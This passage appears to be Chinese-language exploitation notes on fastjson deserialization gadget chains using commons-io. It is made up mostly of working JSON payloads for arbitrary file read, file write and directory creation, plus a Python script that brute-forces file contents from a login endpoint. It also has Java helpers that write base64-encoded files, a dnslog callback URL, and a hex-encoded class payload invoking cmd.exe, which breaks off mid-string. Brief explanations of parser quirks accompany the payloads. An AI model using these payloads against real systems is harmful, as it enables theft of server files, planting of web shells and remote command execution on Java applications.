&quot;charsetName&quot;: &quot;UTF-8&quot;,        &quot;bytes&quot;: [          98        ]      &#125;    ]  &#125;,  &quot;address&quot; : &#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,              &quot;charSequence&quot;: &#123;&quot;@type&quot;: &quot;java.lang.String&quot;&#123;&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;&#125;,&quot;start&quot;: 0,&quot;end&quot;: 0&#125;,  &quot;xxx&quot;: &#123;      &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,      &quot;delegate&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;          &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,          &quot;url&quot;: &quot;http://aaaxasd.g2pbiw.dnslog.cn/&quot;          &#125;,        &quot;charsetName&quot;: &quot;UTF-8&quot;,        &quot;bufferSize&quot;: 1024      &#125;,      &quot;boms&quot;: [&#123;&quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;, &quot;charsetName&quot;: &quot;UTF-8&quot;, &quot;bytes&quot;: [1]&#125;]  &#125;,  &quot;zzz&quot;:&#123;&quot;$ref&quot;:&quot;$.xxx.BOM[0]&quot;&#125;&#125;\n\n\n\n配套python脚本：\nimport requestsurl = &quot;http://192.168.1.101/login&quot;#码表可按照实际修改，例如探测jdk目录一般文件名为小写#asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122] #针对linux下正常文件夹或文件读取，去除了一些文件名下不常见的字符，且全为小写 asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122] #针对linux下正常文件夹或文件读取，去除了一些文件名下不常见的字符，且包含大小写 # asciis = [10,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126] #所有可见字符data1 = &quot;&quot;&quot;&#123;    &quot;abc&quot;: &#123;\t\t\t\t&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,        &quot;delegate&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,            &quot;reader&quot;: &#123;                &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,                &quot;url&quot;: &quot;file:///usr/local/tomcat/&quot; # 修改这个进行列目录            &#125;,            &quot;charsetName&quot;: &quot;UTF-8&quot;,            &quot;bufferSize&quot;: 1024        &#125;,        &quot;boms&quot;: [            &#123;                &quot;charsetName&quot;: &quot;UTF-8&quot;,                &quot;bytes&quot;: [&quot;&quot;&quot;  data2 = &quot;&quot;&quot;                ]            &#125;        ]    &#125;,    &quot;address&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,        &quot;charSequence&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.String&quot;&#123;&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;&#125;,            &quot;start&quot;: 0,            &quot;end&quot;: 0        &#125;    &#125;&#125;&quot;&quot;&quot;proxies = &#123;    &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;,&#125;header = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&quot;,    &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;&#125;def byte2str(bytes):    file_str = &quot;&quot;    for i in file_byte:        file_str += chr(int(i))    print(&quot;【&quot; + file_str + &quot;】&quot;)file_byte = []for i in range(0,50):  # 需要读取多长自己定义，但一次性不要太长，建议分多次读取    for i in asciis:        file_byte.append(str(i))        req = requests.post(url=url,data=data1+&#x27;,&#x27;.join(file_byte)+data2,headers=header)        text = req.text                if &quot;charSequence&quot; not in text:            file_byte.pop()    byte2str(file_byte) print(file_byte)    \n\n\n\nio1&#x2F;io2写文件（编码后支持二进制）https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg\n只能写8kb整的文件，二进制文件写入时必须进行iso-8859-1编码；目录必须存在。\n这里走的是XmlStreamReader构造方法触发getBOM，ioFinal中会改良成直接通过BOMInputStream.getBOM触发。FileWriterWithEncoding也会改成LockableFileWriter，从而自动创建目录。\ncommons-io 2.0 - 2.6 版本：\n&#123;  &quot;x&quot;:&#123;    &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,    &quot;input&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,        &quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;$&#123;content&#125;&quot;      &#125;,      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;:1024    &#125;,    &quot;branch&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,      &quot;writer&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,        &quot;file&quot;:&quot;$&#123;path&#125;&quot;,        &quot;encoding&quot;:&quot;UTF-8&quot;,        &quot;append&quot;: false      &#125;,      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024,      &quot;writeImmediately&quot;: true    &#125;,    &quot;trigger&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;is&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:&#123;          &quot;$ref&quot;:&quot;$.input&quot;        &#125;,        &quot;branch&quot;:&#123;          &quot;$ref&quot;:&quot;$.branch&quot;        &#125;,        &quot;closeBranch&quot;: true      &#125;,      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    &#125;,    &quot;trigger2&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;is&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:&#123;          &quot;$ref&quot;:&quot;$.input&quot;        &#125;,        &quot;branch&quot;:&#123;          &quot;$ref&quot;:&quot;$.branch&quot;        &#125;,        &quot;closeBranch&quot;: true      &#125;,      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    &#125;,    &quot;trigger3&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;is&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:&#123;          &quot;$ref&quot;:&quot;$.input&quot;        &#125;,        &quot;branch&quot;:&#123;          &quot;$ref&quot;:&quot;$.branch&quot;        &#125;,        &quot;closeBranch&quot;: true      &#125;,      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    &#125;  &#125;&#125;\n\n\n\ncommons-io 2.7 - 2.8.0 版本：\n&#123;  &quot;x&quot;:&#123;    &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,    &quot;input&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,        &quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;,        &quot;start&quot;:0,        &quot;end&quot;:2147483647      &#125;,      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;:1024    &#125;,    &quot;branch&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,      &quot;writer&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,        &quot;file&quot;:&quot;/tmp/pwned&quot;,        &quot;charsetName&quot;:&quot;UTF-8&quot;,        &quot;append&quot;: false      &#125;,      &quot;charsetName&quot;:&quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024,      &quot;writeImmediately&quot;: true    &#125;,    &quot;trigger&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;inputStream&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:&#123;          &quot;$ref&quot;:&quot;$.input&quot;        &#125;,        &quot;branch&quot;:&#123;          &quot;$ref&quot;:&quot;$.branch&quot;        &#125;,        &quot;closeBranch&quot;: true      &#125;,      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    &#125;,    &quot;trigger2&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;inputStream&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:&#123;          &quot;$ref&quot;:&quot;$.input&quot;        &#125;,        &quot;branch&quot;:&#123;          &quot;$ref&quot;:&quot;$.branch&quot;        &#125;,        &quot;closeBranch&quot;: true      &#125;,      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    &#125;,    &quot;trigger3&quot;:&#123;      &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,      &quot;inputStream&quot;:&#123;        &quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;:&#123;          &quot;$ref&quot;:&quot;$.input&quot;        &#125;,        &quot;branch&quot;:&#123;          &quot;$ref&quot;:&quot;$.branch&quot;        &#125;,        &quot;closeBranch&quot;: true      &#125;,      &quot;httpContentType&quot;:&quot;text/xml&quot;,      &quot;lenient&quot;:false,      &quot;defaultEncoding&quot;:&quot;UTF-8&quot;    &#125;  &#125;\n\n\n\n解析特性payload里面有这样一段json比较特殊：\n&quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;aaaaaa&quot;\n\n第一个特殊点，为什么不直接写：\n&quot;charSequence&quot;: &quot;aaa&quot;\n\n这里报错的原因是，fastjson把charSequence当作接口，默认作为Java Bean处理。而 “aaa” 会被当作基础的字符串，两者类型不匹配。\n第二个特殊点，为什么能够直接在String后面写 “aaaa”。\n上面报错了以后，我把payload改成了：\n&quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;, &quot;original&quot;:&quot;aaaaaa&quot;&#125;\n\n\n想调用String的构造函数，不过还是报错。\n用正确的payload，跟进调试一下，最终发现是在这里截取。\n\n然后在StringCodec中正式取出：\n\n在调试中发现，String后面不能跟逗号，不然一定报错。跟了逗号，token就会是逗号，那么StringCodec里就会进入上图中打断点的那行，最后进入到switch default中报错。\n第三个特殊点，为什么最后少了一个 } 进行闭合，还能成功解析？\n看一下AI的解释：\n\n\n总得来说，记住有这么一种写法即可。\nio3写文件（≈io1&#x2F;io2）su18发现的类似io1的链，和io1基本一样。https://su18.org/post/fastjson-1.2.68/\nio4写文件（支持二进制）需要commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6。只能写入8kb整，二进制文件写入正常。\n于blackhat上公开：\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\nhttps://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/#toc-heading-32\n// ommons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6    public static void writeIo4() throws IOException &#123;        String json = &quot;&#123;\\n&quot; +                &quot;  \\&quot;@type\\&quot;:\\&quot;java.lang.AutoCloseable\\&quot;,\\n&quot; +                &quot;  \\&quot;@type\\&quot;:\\&quot;org.apache.commons.io.input.BOMInputStream\\&quot;,\\n&quot; +                &quot;  \\&quot;delegate\\&quot;:&#123;\\n&quot; +                &quot;    \\&quot;@type\\&quot;:\\&quot;org.apache.commons.io.input.TeeInputStream\\&quot;,\\n&quot; +                &quot;    \\&quot;input\\&quot;:&#123;\\n&quot; +                &quot;      \\&quot;@type\\&quot;: \\&quot;org.apache.commons.codec.binary.Base64InputStream\\&quot;,\\n&quot; +                &quot;      \\&quot;in\\&quot;:&#123;\\n&quot; +                &quot;        \\&quot;@type\\&quot;:\\&quot;org.apache.commons.io.input.CharSequenceInputStream\\&quot;,\\n&quot; +                &quot;        \\&quot;charset\\&quot;:\\&quot;utf-8\\&quot;,\\n&quot; +                &quot;        \\&quot;bufferSize\\&quot;: 1024,\\n&quot; +                &quot;        \\&quot;cs\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.String\\&quot;\\&quot;%1$s\\&quot;\\n&quot; +                &quot;      &#125;,\\n&quot; +                &quot;      \\&quot;doEncode\\&quot;:false,\\n&quot; +                &quot;      \\&quot;lineLength\\&quot;:1024,\\n&quot; +                &quot;      \\&quot;lineSeparator\\&quot;:\\&quot;5ZWKCg==\\&quot;,\\n&quot; +                &quot;      \\&quot;decodingPolicy\\&quot;:0\\n&quot; +                &quot;    &#125;,\\n&quot; +                &quot;    \\&quot;branch\\&quot;:&#123;\\n&quot; +                &quot;      \\&quot;@type\\&quot;:\\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\\&quot;,\\n&quot; +                &quot;      \\&quot;targetPath\\&quot;:\\&quot;%2$s\\&quot;,\\n&quot; +                &quot;      \\&quot;append\\&quot;:false,\\n&quot; +                &quot;      \\&quot;alwaysCreate\\&quot;:true\\n&quot; +                &quot;    &#125;,\\n&quot; +                &quot;    \\&quot;closeBranch\\&quot;:false\\n&quot; +                &quot;  &#125;,\\n&quot; +                &quot;  \\&quot;include\\&quot;:true,\\n&quot; +                &quot;  \\&quot;boms\\&quot;:[&#123;\\n&quot; +                &quot;                  \\&quot;@type\\&quot;: \\&quot;org.apache.commons.io.ByteOrderMark\\&quot;,\\n&quot; +                &quot;                  \\&quot;charsetName\\&quot;: \\&quot;UTF-8\\&quot;,\\n&quot; +                &quot;                  \\&quot;bytes\\&quot;:%3$s\\n&quot; +                &quot;                &#125;],\\n&quot; +                &quot;  \\&quot;x\\&quot;:&#123;\\&quot;$ref\\&quot;:\\&quot;$.bOM\\&quot;&#125;\\n&quot; +                &quot;&#125;&quot;;        // 要写入的文件        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:/flag.txt&quot;));        //写文本时要填充数据        String content = new String(bytes, StandardCharsets.UTF_8);        for (int i=0; i&lt;8192; i++)&#123;            content = content + &quot;a&quot;;        &#125;        byte[] bytesPadding = content.getBytes();        String base64Content = Base64.getEncoder().encodeToString(bytesPadding);        String path = &quot;D:/1tmp/111.txt&quot;;        String format = String.format(json, base64Content, path, Arrays.toString(bytesPadding));        JSON.parse(format);    &#125;\n\n\n\nio5写文件&#x2F;创建目录（io4换依赖，能写任意大小文件）在io4的基础上，用anti依赖代替了aspectjtools。可以写8kb以上二进制文件。LockableFileWriter可以创建目录\nhttps://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew\n目录创建：\n&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;, &quot;writer&quot;:&#123; &quot;@type&quot;:&quot;org.apache.commons.io.output.LockableFileWriter&quot;, &quot;file&quot;:&quot;/etc/passwd&quot;, //一个存在的文件 &quot;encoding&quot;:&quot;UTF-8&quot;, &quot;append&quot;: true,&quot;lockDir&quot;:&quot;/usr/lib/jvm/java-8-openjdk-amd64/jre/classes&quot; //要创建的目录 &#125;, &quot;charset&quot;:&quot;UTF-8&quot;, &quot;bufferSize&quot;: 8193, &quot;writeImmediately&quot;: true &#125;\n\n\n\n任意文件写入：\npublic static void writeIo5() throws IOException &#123;        String json = &quot;&#123;\\n&quot; +                &quot;  \\&quot;@type\\&quot;:\\&quot;java.lang.AutoCloseable\\&quot;,\\n&quot; +                &quot;  \\&quot;@type\\&quot;:\\&quot;org.apache.commons.io.input.BOMInputStream\\&quot;,\\n&quot; +                &quot;  \\&quot;delegate\\&quot;:&#123;\\n&quot; +                &quot;    \\&quot;@type\\&quot;:\\&quot;org.apache.commons.io.input.TeeInputStream\\&quot;,\\n&quot; +                &quot;    \\&quot;input\\&quot;:&#123;\\n&quot; +                &quot;      \\&quot;@type\\&quot;: \\&quot;org.apache.commons.codec.binary.Base64InputStream\\&quot;,\\n&quot; +                &quot;      \\&quot;in\\&quot;:&#123;\\n&quot; +                &quot;        \\&quot;@type\\&quot;:\\&quot;org.apache.commons.io.input.CharSequenceInputStream\\&quot;,\\n&quot; +                &quot;        \\&quot;charset\\&quot;:\\&quot;utf-8\\&quot;,\\n&quot; +                &quot;        \\&quot;bufferSize\\&quot;: 1024,\\n&quot; +                &quot;        \\&quot;cs\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.String\\&quot;\\&quot;%1$s\\&quot;\\n&quot; +                &quot;      &#125;,\\n&quot; +                &quot;      \\&quot;doEncode\\&quot;:false,\\n&quot; +                &quot;      \\&quot;lineLength\\&quot;:1024,\\n&quot; +                &quot;      \\&quot;lineSeparator\\&quot;:\\&quot;5ZWKCg==\\&quot;,\\n&quot; +                &quot;      \\&quot;decodingPolicy\\&quot;:0\\n&quot; +                &quot;    &#125;,\\n&quot; +                &quot;    \\&quot;branch\\&quot;:&#123;\\n&quot; +                //&quot;      \\&quot;@type\\&quot;:\\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\\&quot;,\\n&quot; +                //&quot;      \\&quot;targetPath\\&quot;:\\&quot;%2$s\\&quot;\\n&quot; +                &quot;      \\&quot;@type\\&quot;:\\&quot;org.apache.tools.ant.util.LazyFileOutputStream\\&quot;,\\n&quot; +                &quot;      \\&quot;file\\&quot;:\\&quot;%2$s\\&quot;,\\n&quot; +                &quot;      \\&quot;append\\&quot;:false,\\n&quot; +                &quot;      \\&quot;alwaysCreate\\&quot;:true\\n&quot; +                &quot;    &#125;,\\n&quot; +                &quot;    \\&quot;closeBranch\\&quot;:false\\n&quot; +                &quot;  &#125;,\\n&quot; +                &quot;  \\&quot;include\\&quot;:true,\\n&quot; +                &quot;  \\&quot;boms\\&quot;:[&#123;\\n&quot; +                &quot;                  \\&quot;@type\\&quot;: \\&quot;org.apache.commons.io.ByteOrderMark\\&quot;,\\n&quot; +                &quot;                  \\&quot;charsetName\\&quot;: \\&quot;UTF-8\\&quot;,\\n&quot; +                &quot;                  \\&quot;bytes\\&quot;:&quot; +&quot;%3$s\\n&quot; +                &quot;                &#125;],\\n&quot; +                &quot;  \\&quot;x\\&quot;:&#123;\\&quot;$ref\\&quot;:\\&quot;$.bOM\\&quot;&#125;\\n&quot; +                &quot;&#125;&quot;;        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\flag.txt&quot;));        String content = Base64.getEncoder().encodeToString(bytes);        String path = &quot;D:/1tmp/111.txt&quot;;        String string = Arrays.toString(bytes);        String format = String.format(json, content, path, string);        JSON.parse(format);    &#125;\n\n\n\nio6&#123;    &quot;a&quot;: &#123;      &quot;@type&quot;: &quot;java.io.InputStream&quot;,      &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,      &quot;in&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceInputStream&quot;,          &quot;cs&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.String&quot;            &quot;$&#123;shellcode&#125;&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;bufferSize&quot;: $&#123;size&#125;          &#125;,          &quot;branch&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,            &quot;writer&quot;: &#123;              &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,              &quot;file&quot;: &quot;$&#123;file2write&#125;&quot;,              &quot;charset&quot;: &quot;iso-8859-1&quot;,              &quot;append&quot;: true            &#125;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;bufferSize&quot;: 1024,            &quot;writeImmediately&quot;: true          &#125;,          &quot;closeBranch&quot;: true        &#125;      &#125;,      &quot;b&quot;: &#123;        &quot;@type&quot;: &quot;java.io.InputStream&quot;,        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.input.XmlStreamReader&quot;,          &quot;inputStream&quot;: &#123;            &quot;$ref&quot;: &quot;$.a&quot;          &#125;,          &quot;httpContentType&quot;: &quot;text/xml&quot;,          &quot;lenient&quot;: false,          &quot;defaultEncoding&quot;: &quot;iso-8859-1&quot;        &#125;,        &quot;charsetName&quot;: &quot;iso-8859-1&quot;,        &quot;bufferSize&quot;: 1024      &#125;,      &quot;c&quot;: &#123;&#125;    &#125;  \n\nio7https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww\n&#123;  &quot;dd&quot;:&#123;  &quot;@type&quot;:&quot;java.util.Currency&quot;,  &quot;val&quot;:&#123;  &quot;currency&quot;:&#123;  &quot;w&quot;:&#123;    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,    &quot;delegate&quot;:&#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,      &quot;in&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,        &quot;input&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceInputStream&quot;,          &quot;cs&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.String&quot;            &quot;\\xff&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;bufferSize&quot;: 1          &#125;,          &quot;branch&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,            &quot;writer&quot;: &#123;              &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,              &quot;file&quot;: &quot;/tmp/1.jpg&quot;,              &quot;encoding&quot;: &quot;iso-8859-1&quot;,              &quot;charset&quot;: &quot;iso-8859-1&quot;,              &quot;append&quot;: false            &#125;,            &quot;charset&quot;:&quot;iso-8859-1&quot;,            &quot;charsetName&quot;:&quot;iso-8859-1&quot;,            &quot;bufferSize&quot;: 1024,            &quot;writeImmediately&quot;: true          &#125;,          &quot;closeBranch&quot;: true        &#125;      &#125;,    &quot;include&quot;:true,    &quot;boms&quot;:[&#123;                    &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,                    &quot;charsetName&quot;: &quot;iso-8859-1&quot;,                    &quot;bytes&quot;:[0, 0,0]                  &#125;]  &#125;  &#125;  &#125;  &#125;  &#125;\n\n\n\nioFinal使用java-chains生成：\n&#123;  &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,  &quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,  &quot;delegate&quot;:&#123;    &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,    &quot;in&quot;: &#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,      &quot;input&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;           &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,           &quot;charSequence&quot;: &#123;           &quot;@type&quot;: &quot;java.lang.String&quot;           &quot;\\xca\\xfe\\xba\\xbe\\x00\\x00\\x00\\x32\\x00\\x41\\x01\\x00\\x49\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68\\x65\\x2f\\x62\\x65\\x61\\x6e\\x75\\x74\\x69\\x6c\\x73\\x2f\\x63\\x6f\\x79\\x6f\\x74\\x65\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x52\\x61\\x77\\x56\\x61\\x6c\\x75\\x65\\x39\\x38\\x35\\x32\\x36\\x34\\x39\\x66\\x39\\x36\\x35\\x62\\x34\\x35\\x31\\x66\\x62\\x38\\x63\\x39\\x38\\x66\\x36\\x35\\x30\\x62\\x36\\x30\\x65\\x31\\x34\\x34\\x07\\x00\\x01\\x01\\x00\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63\\x74\\x07\\x00\\x03\\x01\\x00\\x04\\x62\\x61\\x73\\x65\\x01\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x01\\x00\\x03\\x73\\x65\\x70\\x01\\x00\\x03\\x63\\x6d\\x64\\x01\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\\x3e\\x01\\x00\\x03\\x28\\x29\\x56\\x01\\x00\\x13\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x07\\x00\\x0b\\x0c\\x00\\x09\\x00\\x0a\\x0a\\x00\\x04\\x00\\x0d\\x01\\x00\\x07\\x6f\\x73\\x2e\\x6e\\x61\\x6d\\x65\\x08\\x00\\x0f\\x01\\x00\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x79\\x73\\x74\\x65\\x6d\\x07\\x00\\x11\\x01\\x00\\x0b\\x67\\x65\\x74\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x01\\x00\\x26\\x28\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x0c\\x00\\x13\\x00\\x14\\x0a\\x00\\x12\\x00\\x15\\x01\\x00\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x07\\x00\\x17\\x01\\x00\\x0b\\x74\\x6f\\x4c\\x6f\\x77\\x65\\x72\\x43\\x61\\x73\\x65\\x01\\x00\\x14\\x28\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x0c\\x00\\x19\\x00\\x1a\\x0a\\x00\\x18\\x00\\x1b\\x01\\x00\\x03\\x77\\x69\\x6e\\x08\\x00\\x1d\\x01\\x00\\x08\\x63\\x6f\\x6e\\x74\\x61\\x69\\x6e\\x73\\x01\\x00\\x1b\\x28\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x43\\x68\\x61\\x72\\x53\\x65\\x71\\x75\\x65\\x6e\\x63\\x65\\x3b\\x29\\x5a\\x0c\\x00\\x1f\\x00\\x20\\x0a\\x00\\x18\\x00\\x21\\x01\\x00\\x07\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x08\\x00\\x23\\x0c\\x00\\x05\\x00\\x06\\x09\\x00\\x02\\x00\\x25\\x01\\x00\\x02\\x2f\\x63\\x08\\x00\\x27\\x0c\\x00\\x07\\x00\\x06\\x09\\x00\\x02\\x00\\x29\\x01\\x00\\x07\\x2f